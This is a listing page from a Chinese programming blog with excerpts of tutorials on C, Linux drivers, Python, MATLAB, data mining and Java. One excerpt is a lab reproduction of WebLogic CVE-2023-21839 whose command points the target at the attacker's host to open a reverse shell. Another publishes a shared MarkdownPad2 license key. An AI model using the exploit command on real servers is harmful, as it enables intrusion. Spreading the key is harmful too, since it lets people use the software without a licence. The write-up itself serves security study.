<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程中国的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程中国的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40ab148d5de8888ca7a561503882e6e8/" rel="bookmark">
			C语言中char数组和char指针有什么区别？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		让我们通过下面的例子，来了解 C语言中字符数组和字符指针之间的区别。
void test() { //arr is array of characters char arr[12] = "Aticleworld"; //ptr is pointer to char char *ptr = "Aticleworld"; } 现在，让我们比较arr（字符数组）和ptr（字符指针）。
区别1：
字符串文本是用双引号括起来的零个或多个多字节字符的序列。当你编写语句 char arr[12] = "Aticleworld" 时，字符串文本中的字符被复制到 arr.
当您编写语句 char *ptr = "Aticleworld" 时，您是让字符串文本数组进行数组到指针的转换，以获取指向其第一个元素的指针。指针 ptr 指向字符串文本数组的第一个元素 （'A').
区别2：
arr 是存储在连续内存位置的字符集合，而 ptr 保存字符的地址。
arr 包含 12 个元素，每个元素位于连续的内存位置。另一方面，ptr 保存字符串文本的第一个字符的地址。
区别3：
当我们在 char 数组 arr 上使用 sizeof 运算符时，它给出字符总数，而 char 指针 ptr 只给出指针的大小。如下：
#include &lt;stdio.h&gt; int main() { //arr is array of characters char arr[] = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/40ab148d5de8888ca7a561503882e6e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d95d1336b03cc040d050f03f8b7ac63/" rel="bookmark">
			使用platform总线编写驱动，应用层程序，在应用层通过ioctl控制LED灯流水，当按键KEY1按下，让风扇转动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		head.h:
#ifndef __MYLED_H__ #define __MYLED_H__ #define LED_ON _IOW('a',1,int) #define LED_OFF _IOW('a',0,int) enum{ LED1, LED2, LED3, }; #endif mydev.c:
#include &lt;linux/init.h&gt; #include &lt;linux/module.h&gt; #include&lt;linux/fs.h&gt; #include&lt;linux/uaccess.h&gt; #include&lt;linux/io.h&gt; #include&lt;linux/device.h&gt; #include &lt;linux/of.h&gt; #include &lt;linux/of_gpio.h&gt; #include&lt;linux/interrupt.h&gt; #include&lt;linux/of_irq.h&gt; #include &lt;linux/platform_device.h&gt; #include &lt;linux/mod_devicetable.h&gt; #include "mydev.h" struct resource *res; int irqno; int major; struct class *cls; struct device *dev; int i; char kbuf[128]={0}; struct gpio_desc* gpiono1; struct gpio_desc* gpiono2; struct gpio_desc* gpiono3; struct gpio_desc* gpiono4; //中断处理函数 irqreturn_t irq1_handler(int irqno, void *arg) { gpiod_set_value(gpiono4,!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d95d1336b03cc040d050f03f8b7ac63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df9b6b706bdeb4747578702be7f6bdfe/" rel="bookmark">
			Python基础—读写模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、数据持久化 问：为什么要数据持久化？ 持久化将程序数据在持久状态和瞬时状态转化的机制 将瞬时状态（内存中的数据，是不能永久保存）转换为持久数据（硬盘中的数据，能够长久保存） 持久化的应用是将内存中的对象存储在硬盘、数据库等位置 二、文本文件的读写模式 1. 使用Python打开一个文件：open方法 语法：open(参数1, 参数2, 参数3, …) 参数2：mode —— 文件打开的读写方式 注意：文件的读或者写不能同时进行 2. 文件打开的模式 w：只写，先清空内容再写入内容，如果文件不存在，先创建，再写入 a： 只写，直接在文件末尾追加写，如果文件不存在，先创建，再写入 r： 只读，如果文件不存在，报错 3. 打开文件以后操作文件的数据类型 t： 读写的数据类型必须是文本（text） b：读写的数据类型必须是二进制（bytes） 上述两种模式各选其一组合使用 例如：wt、 tw、 at、 ta、 rt、 tr等等 二进制文件（图片、音频、视频等）必须以b模式打开，文本文件等要用t模式打开 三、文本文件的写操作 1. open方法的使用 open方法用于打开一个文件并返回被打开的这个文件对象 open(参数1，参数2，参数3，…) 参数1：file —— 文件的路径以及文件名（文件路径分为相对路径和绝对路径，编程中仅仅使用相对路径） 参数2：mode —— 文件打开的读写模式 参数3：编码方式 —— encoding：一般将encoding写为utf-8，但是有些文件编码不是utf-8，而是gbk等编码 绝对路径：以盘符为参照物，对盘符来说文件的位置 相对路径：以某个文件为参照物，另一个文件的位置 3. 文本文件的写操作 ①打开一个文件，如果文件不存在，创建文件 file = open('./古诗.text', 'wt', encoding='utf-8') ②向打开的文本文件中写入内容 file.write('静夜思\n') file.write('唐.李白\n') str_1 = '床前明月光，\n疑是地上霜，\n举头望明月，\n低头思故乡。\n' file.write('str_1') ③关闭文件 file.close() 运行后系统生成一个古诗.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df9b6b706bdeb4747578702be7f6bdfe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e89608a1ed721ad9c963b7d01af9297/" rel="bookmark">
			如何使用arcmap绘制核密度图（笔记）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ArcMap中的点密度和核密度都是用来分析点数据分布的工具，但它们的计算方法和结果解释有所不同。
点密度是指在一个给定区域内，点的数量与该区域面积的比值。点密度分析可以帮助我们确定点数据的分布情况，以及哪些区域点分布较为密集。点密度分析的结果是一个根据点数量和区域面积计算出的密度值，通常用颜色渐变的方式表示在不同区域内点的密度值。
核密度分析是一种基于空间统计学的方法，它通过计算每个点周围一定距离内的点的数量来确定点数据的分布情况。核密度分析的结果是一个根据点分布情况计算出的密度值，通常用等高线的方式表示在不同区域内点的密度值。核密度分析可以帮助我们确定点数据的热点区域，即点分布较为密集的区域。
因此，点密度和核密度的区别在于计算方法和结果解释的不同。点密度分析适用于简单的点分布情况，而核密度分析适用于更复杂的点分布情况，可以更准确地确定热点区域。
Arcmap绘制核密度图
首先，可以在如下网址上可以回去你想要的地理信息（.json格式）http://datav.aliyun.com/portal/school/atlas/area_selector
选择你想要的区域，然后点击右侧“其他类型后面的下载按钮”。
下载完成之后可以使用python将.json格式的数据转换成arcmap所需要的数据格式（.shp格式）。
成功转成.shp格式之后，打开arcmap软件，工具栏那行选择黄色菱形上面有的黑色的+（Add Data），选择你转换好的.shp格式。导进去就出现你所需的地图形状。
接下来添加带有经纬度的数据（经度列名改成X，纬度列名改成Y。），文件——Add Data——Add XY Data，可以添加excel格式的数据，然后选择导出数据，就可以把Excel格式的数据转换成.shp格式的数据，以便做核密度分析。
接下来就开始做核密度分析啦
选择Geoprocessing——ArcToolbox（进行双击），接下来找到Spatial Analyst——Density——Kernel Density（双击），第一行Input Point or polyline features选择你导入的带有经纬度数据（.shp格式），选择下方的Environments(双击)，找到processing Extent(选择你所选区域地图)，再找到Raster Analysis——Mask(选择你所选区域地图),点击OK。输出大小和搜索半径可以根据你自己的数据进行设置。全部设置完成后点击OK，等待分析结果。
最后，生成核密度图，你可以进行微调，选择你喜欢的颜色等。双击所生成的核密度图，出现图层属性面板，选择“符号化”——“分类”，color Ramp可以修改核密度的颜色，classes是分类个数，classify可以调整分类的间距。这些可以根据自己喜好，或者根据数据进行调整。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/255e428f7c42e081a44f64664d70c532/" rel="bookmark">
			Web前端性能测试方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 今天介绍个前端性能测试的基本套路。
Web前端性能测试可以从以下几个方面入手：
1.页面加载性能测试：测试网页的加载时间，包括页面的首次加载、资源（如图片、脚本、样式表等）的加载、页面响应时间等。
2.页面渲染性能测试：测试页面的渲染时间，包括DOM树的构建、CSS样式计算、布局和绘制等。
3. 动态交互性能测试：测试网页中动态交互的性能，包括JavaScript脚本的执行时间、事件处理和响应时间等。
4. 移动端性能测试：测试移动端网页的性能，包括移动设备上的页面加载速度、渲染性能、网络传输速度等。
测试方法：
1. 使用性能分析工具：例如Chrome浏览器的开发者工具中的性能面板、Firefox浏览器的火焰图等，可以对页面进行详细的性能分析和统计。
2. 使用网站性能测试工具：例如Google PageSpeed Insights、WebPageTest等在线性能测试工具，可以测试页面的速度、优化建议等。
3. 使用测试框架或库：例如JMeter、Selenium等，可以通过模拟用户行为进行压力测试、性能测试等。
4.使用代码分析工具：例如Webpack Bundle Analyzer、Code Splitting等，可以优化代码和资源加载方案，提高页面性能。
在测试时，需要注意测试环境的稳定和一致性，测试数据的准确和可靠性，以及测试结果的分析和解释。
Web前端测试最重要的是测试结果的分析和解释。所以方法和测试结果呈现只是开始，性能调优才是重头戏。
最后： 下方这份完整的软件测试视频学习教程已经整理上传完成，朋友们如果需要可以自行免费领取【保证100%免费】
这些资料，对于【软件测试】的朋友来说应该是最全面最完整的备战仓库，这个仓库也陪伴上万个测试工程师们走过最艰难的路程，希望也能帮助到你！
软件测试面试文档 我们学习必然是为了找到高薪的工作，下面这些面试题是来自阿里、腾讯、字节等一线互联网大厂最新的面试资料，并且有字节大佬给出了权威的解答，刷完这一套面试资料相信大家都能找到满意的工作。
面试文档获取方式： 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cae972686d2efff2f3288615650c23d5/" rel="bookmark">
			编写驱动，应用层程序，在应用层通过ioctl控制LED灯流水，当按键KEY1按下，让风扇转动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mydev.h:
#ifndef __MYLED_H__ #define __MYLED_H__ #define LED_ON _IOW('a',1,int) #define LED_OFF _IOW('a',0,int) enum{ LED1, LED2, LED3, }; #endif mydev.c:
#include &lt;linux/init.h&gt; #include &lt;linux/module.h&gt; #include&lt;linux/fs.h&gt; #include&lt;linux/uaccess.h&gt; #include&lt;linux/io.h&gt; #include&lt;linux/device.h&gt; #include&lt;linux/poll.h&gt; #include &lt;linux/of.h&gt; #include &lt;linux/timer.h&gt; #include &lt;linux/of_gpio.h&gt; #include&lt;linux/interrupt.h&gt; #include&lt;linux/of_irq.h&gt; #include "mydev.h" int major; int irqno; struct class *cls; struct device *dev; char kbuf[128]={0}; struct device_node *dnode; struct device_node *dnode1; struct gpio_desc* gpiono1; struct gpio_desc* gpiono2; struct gpio_desc* gpiono3; struct gpio_desc* gpiono4; irqreturn_t irq1_handler(int irqno, void *arg) { gpiod_set_value(gpiono4,!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cae972686d2efff2f3288615650c23d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c8c8620661d102ce6419a0c81df8817/" rel="bookmark">
			Bat一键启动多个程序和命令【详细总结】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hello!忙了好久,最近挺忙的,不知不觉已经来到星期六了,博客好久也没发文了,
恰好自己最近来开机总是手动点击启动许多服务和命令,好麻烦(懒人思想~哈哈),我就思考着windows有没有像Linux系统一样的批处理脚本,只要一键就可以启动呢?
好家伙!!搜了搜,有个bat的批处理系统,好了,说了半天的废话了,来~进入正题.
文章目录 1.`bat`脚本的制作新建`TXT`文件===&gt; `.txt`改成`.bat` 如下图所示 2.`bat`的启动命令这边就是本文的核心内容了,你也需要知道一些`bat`命令 `bat`一键启动多个应用程序脚本`demo`解释下命令:`echo`: 输出字符串 就是和`java`中的`System.out.println()`打印输出差不多`@echo off`:表示关闭回显 只显示**打印结果** 就是显示路径名和不显示路径名以及命令行详细信息(什么??听不懂我说的牛马东西???***直接看下图**)`chcp 65001 `:防止中文乱码问题`::`或者`rem`:表示注释的作用 和`java`中`//`双斜杠起**注释的作用**差不多`start "nacos" cmd /k call nacos_start.bat``/k`： 表示新窗口打开`call`： 表示执行.bat文件`cd`:选择的作用`pause`: 作用是将dos界面暂停关闭`exit`: 窗口直接退出关闭`%cd% `或者` %~dp0`: 打印当前路径`/b `:`del`标识符可以删除文件，自行测试 测试用例:(摘抄哈!!) 1.bat脚本的制作 首先解释下,bat就是一个windows脚本命令执行文件
创建很简单:
新建TXT文件===&gt; .txt改成.bat 如下图所示 新建文件
修改后缀
创建完成
2.bat的启动命令 这边就是本文的核心内容了,你也需要知道一些bat命令 嗯!~有的小伙伴说,先让我实现功能,让我看到一键启动效果,哪些啥命令的我后面细细看
好嘞好嘞!!,下面的这个demo就是很详细的哈!!~粘贴复制即可
bat一键启动多个应用程序脚本demo ::关闭回显 @echo off ::防止中文乱码 chcp 65001 ::设置dos窗口的命令 title 一键启动多个脚本和程序demo ::set param1=hello ::set param2=world ::echo %param1%%param2% ::显示当前磁盘路径命令行 echo %cd% ::启动idea echo IDEA START start /d "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c8c8620661d102ce6419a0c81df8817/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45a038e4bce58bb0222bcc992c6a93b1/" rel="bookmark">
			添加右键自定义菜单
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给文件添加右键菜单 打开注册表，进入 计算机\HKEY_CLASSES_ROOT\*\shell ，新建一个项，名字随便取一个，我以VSCode为例，然后在此项中再建立一个项command，默认值即是程序路径，如果还想要一个图标，就在VSCode项中建立一个字符串值名为icon，值为图标路径。
基本配置 注：这里特别说明下，如果不能直接找到程序的图标（有些程序的图标是直接集成在exe程序中的），那icon路径就直接填写exe文件的路径。
命令配置 注：因为需要以当前文件为参数，所以路径后面要加上个%1
给目录添加右键菜单 打开注册表，进入 计算机\HKEY_CLASSES_ROOT\Directory\shell ，新建一个项，名字随便取一个，我以VSCode为例，然后在此项中再建立一个项command，默认值即是程序路径，如果还想要一个图标，就在VSCode项中建立一个字符串值名为icon，值为图标路径。
基本上和上述配置一样，这里不再赘述了。要交代一点的是，命令配置的路径不用%1，而是用%V。%V意思同%1，只不过在路径为空时替换为当前工作路径。
给目录背景添加右键菜单并增加图标 打开注册表，进入 计算机\HKEY_CLASSES_ROOT\Directory\Background\shell ，新建一个项，名字随便取一个，我以Git为例，然后在此项中再建立一个项command，默认值即是程序路径，如果还想要一个图标，就在Git项中建立一个字符串值名为icon，值为图标路径。
添加右键多级菜单 subCommands -- 设置是否为多级菜单，如果不是，不用写此属性 MUIVerb -- 右键菜单的名字，如果不写，默认为项名
icon -- 不仅可以用.ico的图片，还可以用程序.exe
最后效果：
补充：在计算机\HKEY_CLASSES_ROOT\Directory\Background\shell下是右键点击目录的空白处，所看到的菜单（实测右键点桌面也会有，但多级菜单只会显示第一级，故创建多级菜单时想要让桌面也能点还要单独创建）。而在计算机\HKEY_CLASSES_ROOT\*\shell下是右键点击文件所看到的菜单。而在计算机\HKEY_CLASSES_ROOT\DesktopBackground\Shell下是右键点击桌面看到的菜单，目录中不会显示（实测似乎桌面不能创建多级菜单）。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34fff2630c67a3a5b52f1a43e57acc27/" rel="bookmark">
			MarkDown下载和安装图文教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MarkDown下载和安装 一.下载二.安装1.点击下载好的程序 直接安装2.按照下面步骤安装即可3.完成安装3.1 MarkDownpad2注册码秘钥3.2 解决HTML渲染出错 三.使用 一.下载 官网地址: http://markdownpad.com/download.html.
二.安装 1.点击下载好的程序 直接安装 2.按照下面步骤安装即可 3.完成安装 3.1 MarkDownpad2注册码秘钥 邮箱地址：
链接: Soar360@live.com.
授权秘钥：
GBPduHjWfJU1mZqcPM3BikjYKF6xKhlKIys3i1MU2eJHqWGImDHzWdD6xhMNLGVpbP2M5SN6bnxn2kSE8qHqNY5QaaRxmO3YSMHxlv2EYpjdwLcPwfeTG7kUdnhKE0vVy4RidP6Y2wZ0q74f47fzsZo45JE2hfQBFi2O9Jldjp1mW8HUpTtLA2a5/sQytXJUQl/QKO0jUQY4pa5CCx20sV1ClOTZtAGngSOJtIOFXK599sBr5aIEFyH0K7H4BoNMiiDMnxt1rD8Vb/ikJdhGMMQr0R4B+L3nWU97eaVPTRKfWGDE8/eAgKzpGwrQQoDh+nzX1xoVQ8NAuH+s4UcSeQ== 在这里遇见一个错误 说license格式不正确
重新输入了一下，别复制粘贴错，即可
点击ok-&gt;进到下面这个界面
不想使用英文，可以汉化一下
改好之后需要重启一下MarkDown，点击确定即可。
然后，这里还遇见了一个问题
3.2 解决HTML渲染出错 awesomium的官网已经关闭很久了，所以找不到正规的下载地址。
而csdn上面的又shoufei。所以这里提供一个1.6.6版本的，找了好久才找到，我这面放到百度网盘，供大家有需要的使用。
下载地址：
管控严格，路径放不上来
安装完成之后会有一个提示，需要重启一下电脑生效。
不容易啊！！！
重启之后即可使用
三.使用 希望可以帮助到读者，安装markdown坑真多啊！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d8826a8a0536454b6da9e1a334070ad/" rel="bookmark">
			编写led灯的设备树节点并驱动三盏灯点亮
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		步骤：
1.解析对应设备的设备树节点 struct device_node *of_find_node_by_name(struct device_node *from, const char *name); 2.根据解析得到的设备树节点结构体去解析得到对应的gpio编号 int of_get_named_gpio(struct device_node *np, const char *propname, int index) 3.向内核申请要使用的gpio编号 int gpio_request(unsigned gpio, const char *label) 4.设置gpio编号对应的gpio管脚为输出模式，并且输出电平（0:低电平，1：高电平） int gpio_direction_output(unsigned gpio, int value) 5.设置输出指定的数值（0:低电平，1：高电平） void gpio_set_value(unsigned gpio, int value) 6.将注册的gpio编号在内核中注销 void gpio_free(unsigned gpio); //编写自己的led设备树节点 myleds{ led1=&lt;&amp;gpioe 10 0&gt;; led2=&lt;&amp;gpiof 10 0&gt;; led3=&lt;&amp;gpioe 8 0&gt;; }; 驱动代码：
#include &lt;linux/init.h&gt; #include &lt;linux/module.h&gt; #include&lt;linux/fs.h&gt; #include&lt;linux/uaccess.h&gt; #include&lt;linux/io.h&gt; #include&lt;linux/device.h&gt; #include&lt;linux/poll.h&gt; #include &lt;linux/of.h&gt; #include &lt;linux/timer.h&gt; #include &lt;linux/of_gpio.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d8826a8a0536454b6da9e1a334070ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1344571593dc1fa2cd81997c7c699502/" rel="bookmark">
			matlab画图（线条颜色以及线型）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		类型表示含义颜色'r'红色'y'黄色'k'黑色'w'白色'm'品红'c'青蓝'g'绿色'b'蓝色线型'-'实线'-.'点划线'--'虚线':'点线 例如：
x=0:pi/100:2*pi; y=sin(x); plot(x,y) 运行结果如下图所示 ：
x=0:pi/100:2*pi; y1=sin(x); y2=cos(x); figure; %%打开图窗命令 plot(x,y1,'-.g');%%函数sin(x)用'-.g'点划线绿色表示 hold on; %%当前轴及图像保持而不被刷新 plot(x,y2,':m'); %%函数cos(x)用':m'虚线品红色表示 xlabel('\fontname{Times New Roman}x'); %%x坐标轴 ylabel('\fontname{Times New Roman}y'); %%y坐标轴 legend('sin(x)','cos(x)');%%图例 hold off; %%hold on 和hold off，是相对使用的 运行结果如下图所示 ：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55dc56f2927a9304d60308eca85ea089/" rel="bookmark">
			【漏洞复现】Weblogic CVE-2023-21839
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、漏洞简介 1. 产品简介 WebLogic是Oracle公司研发的用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器，在全球范围内被广泛使用。
2. 漏洞简介 Oracle发布安全公告，修复了一个存在于WebLogic Core中的远程代码执行漏洞（CVE-2023-21839），可在未经身份验证的情况下通过T3、IIOP协议远程访问并破坏易受攻击的WebLogic Server，成功利用该漏洞可能导致未授权访问和敏感信息泄露。
3. 危害等级 高危
4. 影响范围 Oracle Weblogic Server 12.2.1.3.0
Oracle Weblogic Server 12.2.1.4.0
Oracle Weblogic Server 14.1.1.0.0
二、复现环境 靶机（搭建的Vulhub漏洞测试靶场）：192.168.15.15
攻击机（kali）：192.168.15.131
Vulhub漏洞测试靶场的搭建可参考：Vulhub漏洞测试靶场搭建
三、复现过程 1. 启动漏洞环境 使用Vulhub启动漏洞环境
2. 验证漏洞环境 访问链接：http://192.168.15.15:7001/console/login/LoginForm.jsp 即可访问到后台管理登录界面，出现以下界面证明环境搭建成功。
3. 漏洞复现 用到的两个工具：JNDIExploit-1.2-SNAPSHOT.jar、CVE-2023-21839
第一步：使用工具JNDIExploit-1.2-SNAPSHOT.jar在kali上设置监听：
第二步：打开kali监听端口
第三步：使用CVE-2023-21839工具来进行攻击测试（将工具上传至kali进行编译，然后再执行）
cd cmd go build -o CVE-2023-21839 ./CVE-2023-21839 -ip 192.168.15.15 -port 7001 -ldap ldap://192.168.15.131:1389/Basic/ReverseShell/192.168.15.131/6666 第一次执行报错 提示 Exception in thread "LDAPListener client connection reader for connection from 的错误。解决方法：需要去下载对应服务器版本的java的版本。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55dc56f2927a9304d60308eca85ea089/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c4278dd9ce56ecc0c4a914765916983/" rel="bookmark">
			数据挖掘(2.2)--数据预处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
二、数据描述
1.描述数据中心趋势
1.1平均值和截断均值 1.2加权平均值
1.3中位数（Median）和众数(Mode)
2.描述数据的分散程度
2.1箱线图
2.2方差和标准差
2.3正态分布
3.数据清洗
3.1数据缺失的处理
3.2数据清洗
二、数据描述 描述数据的方法,包括描述数据中心趋势的方法如均值、中位数，描述数据的分散程度的方法如方差、标准差,以及数据的其他描述方法如散点图和参数化方法等。
1.描述数据中心趋势 1.1平均值和截断均值 平均值(Mean),又称为均值或算数均值(Arithmeticmean),其计算方式如下:
例如.对于下列学生成绩列表,其算数均值为73.5分,即平均分是73.5分。可以看出，学生的成绩分布大体在平均值附近。
76,89,76,70,70,84,90,84,83,83
截断均值(Trimmed mean),即不考虑离群值,用其他值计算平均值。
如果其中一个同学因某种原因导致成绩太低，为了处理这种情况，可以使用截断均值。使用截断均值来进行计算，如：去除第一个同学的分数,余下9个同学算出分数平均值这比较符合直观印象。在许多比赛环节中,为了避免评委个人的偏好与偏向对整体评分造成影响,通常使用去掉个最低分,去掉一个最高分,用其他分数计算平均分的手段来进行打分,这就是一种形式的截断均值。
1.2加权平均值 加权算术均值( Weighted arithmetic mean)：不希望将所有的数据等同看待,而是希望让一些数据比另一些数据更有代表性,其计算方式如下:
如：比赛打分
评委：80，80，80，80，80
观众：30，40，50，60，50，40，30，20，10，40
希望评委的权重是观众的10倍
评委分数之和*10+观众分数之和/评委人数*10+观众人数
1.3中位数（Median）和众数(Mode) 众数、中位数和均值如图所示,对于仅有一个峰值的分布来说,三者之间的关系可以用一个经验公式来描述:
Mean一Mode= 3*(Mean一Median)
该公式并不一定总是成立,但是可以在一定程度上反映三者之间的关系。
2.描述数据的分散程度 希望数据之间相差很大,还是相差较小,这就是数据的分散程度。
衡量数据的分散程度的一个很好的指标是分位数,a分位数是从负无穷到某一点概率密度函数的积分(分布列求和)为a时那一点的值。比较常用的分位数为最小值(可以认为是0分位数)、0.25分位数(Q1)、中位数(0.5分位数，Q2)、0.75分位数(Q3)和最大值(可以认为是1分位数)。
2.1箱线图 通过这些分位数可以定义一些描述数据分散度的指标。范围是最大值与最小值之差，它描述了数据分布在多大的范围中;中间四分位数极差(IQR)是Q3-Q1，它反映了数据中心部分的分散程度;五数概要是上述5个分位数的整体,通常被用在箱线图中,用于形象表示数据的范围。
在箱线图中,有些数据点由于过于脱离整体,通常希望把它们单独表示出来，这些点称为离群点
(Outlier)。通常使用点与最近的中间四分位数的差来判断是否属于离群点，通常使用一一个常数k(经验值为1.5)与中间四分位数极差的成绩来定义这个临界差值。即当数据不属于以下区间时,认为数据为离群点:
[Q1 - k(Q3 - Q1),Q3 +k(Q3 - Q1)]
2.2方差和标准差 衡量数据分散程度的另外两个常用的指标是方差和标准差。方差通常用S2表示，是数据的平方误差的期望,样本的(无偏)方差的计算公式为:
标准差通常用s表示,标准差是方差的均方根值。正态分布是一种典型的概率分布,其概率密度函数可以使用均值μ和标准差σ两个参数来表示:
2.3正态分布 正态分布是分布比较集中的单峰分布,其主要的概率集中在均值附近,其中,[μ- - σ.p+a]集中了68%的概率,[μ- 2σ,p+2σ]集中了95%的概率,[μ- 3σ,p+ 3o]集中了99. 7%的概率。正态分布的概率分布如图所示。
3.数据清洗 数据清洗中进行的任务包括填补数据中的缺失值，识别数据中的离群点,对有噪声数据进行平滑等。数据清洗在提升数据质量方面具有相当大的作用。
3.1数据缺失的处理 数据缺失可能由各种原因导致
采集设备的故障可能会造成空白数据，一个属性可能与其他属性产生冲突而造成它被删除,数据在录入阶段可能出现误解而未能录人,在数据录入的时刻可能某个属性并不受重视而未被采集,采集数据的需求可能发生了变化造成数据属性集合的变化。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c4278dd9ce56ecc0c4a914765916983/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c57b6c005ae7dd2ee2b110311c51c36/" rel="bookmark">
			stream().sorted()实现排序(升序、降序、多字段排序)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 自然排序
sorted()：自然排序，流中元素需实现Comparable接口
package com.entity;
import lombok.*;
@Data
@ToString
@AllArgsConstructor
@NoArgsConstructor
public class Student implements Comparable&lt;Student&gt; {
private int id;
private String name;
private int age;
@Override
public int compareTo(Student ob) {
return name.compareTo(ob.getName());
}
@Override
public boolean equals(final Object obj) {
if (obj == null) {
return false;
}
final Student std = (Student) obj;
if (this == std) {
return true;
} else {
return (this.name.equals(std.name) &amp;&amp; (this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8c57b6c005ae7dd2ee2b110311c51c36/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed52fa314b03bcf41179d4e84b94687c/" rel="bookmark">
			看书标记【R语言数据分析与挖掘实战】5
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第五章 挖掘模型 5.1 分类预测 回归分析：回归分析是确定预测属性（数值型）与其他变量间相互依赖的定量。关系的最常用的统计学方法。包括线性回归、非线性回归、Logistic回归（因变量有0-1两种取值）、岭回归（自变量间有多重共线性）、主成分回归（自变量间有多重共线性）、偏最小二乘回归等模型。
# 设置工作空间 # 把“数据及程序”文件夹拷贝到F盘下，再用setwd设置工作空间 setwd("F:/数据及程序/chapter5/示例程序") # 读入数据 Data &lt;- read.csv("./data/bankloan.csv")[2:701, ] # 数据命名 colnames(Data) &lt;- c("x1", "x2", "x3", "x4", "x5", "x6", "x7", "x8", "y") # logistic回归模型 glm &lt;- glm(y ~ x1 + x2 + x3 + x4 + x5 + x6 + x7 + x8, family = binomial(link = logit), data = Data) summary(glm) # 逐步寻优法 logit.step &lt;- step(glm, direction = "both") summary(logit.step) # 前向选择法 logit.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed52fa314b03bcf41179d4e84b94687c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e76c5d043126366f8c8c0766992e310c/" rel="bookmark">
			如何在 Python 中混合使用同步和异步函数？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
